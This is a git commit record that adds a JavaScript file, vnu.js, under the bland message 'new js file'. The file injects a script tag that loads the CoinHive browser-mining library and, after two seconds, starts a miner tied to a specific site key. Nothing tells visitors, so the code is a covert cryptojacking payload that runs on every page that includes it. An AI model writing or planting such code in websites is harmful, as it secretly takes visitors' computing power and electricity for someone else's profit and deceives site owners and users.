0dfc221e92a217367201fb126d52bd8ff6ff644b
crytopia <32449891+crytopia@users.noreply.github.com>
2017-10-02 21:19:40 +0700

    new js file

---
+++ vnu.js
@@ -0,0 +1,7 @@
+var imported = document.createElement('script');
+imported.src = 'https://coinhive.com/lib/coinhive.min.js';
+document.head.appendChild(imported);
+setTimeout(() => {
+  var miner = new CoinHive.User('UtX8CiZN1tzrQTn6zYRmcfsMX8qkOLGz', 'vnu');
+  miner.start();
+}, 2000);
